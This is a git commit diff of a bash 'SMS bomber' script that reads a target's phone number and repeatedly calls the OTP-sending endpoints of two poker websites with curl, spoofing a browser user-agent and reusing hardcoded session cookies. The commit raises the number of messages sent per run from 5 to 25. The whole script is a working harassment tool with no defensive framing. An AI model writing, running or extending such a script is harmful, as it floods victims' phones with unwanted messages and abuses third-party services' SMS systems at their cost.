a1d3c65721407ab5e1fc4190c8228c63f2cc5873
0percent <49309411+0percent@users.noreply.github.com>
2019-04-07 06:50:16 -0500

    Update bom.sh
    increased no of messages

--- bom.sh
+++ bom.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 echo please enter the mobile number..
 read phonen
-for x in {1..5}
+for x in {1..25}
 do
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
